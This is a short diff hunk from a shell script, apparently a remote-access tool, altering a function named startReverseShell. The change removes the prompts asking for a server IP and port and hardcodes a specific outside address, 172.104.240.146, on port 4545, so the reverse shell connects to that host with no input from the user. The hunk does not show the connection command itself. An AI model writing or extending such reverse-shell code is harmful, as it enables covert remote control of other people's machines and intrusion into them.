@@ -79,15 +79,13 @@ startReverseShell () {
       port=$(cat /etc/crat_config/crat.ccw | cut -d ":" -f 2)
     else
       if [ -z "$1" ]; then
-        echo "Please enter the IP address of the server you want to connect to"
-        read -p "IP: " ip
+        ip="172.104.240.146"
       else
         ip=$1
       fi
 
       if [ -z "$2" ]; then
-        echo "Please enter the port of the server you want to connect to"
-        read -p "Port: " port
+        port="4545"
       else
         port=$2
       fi
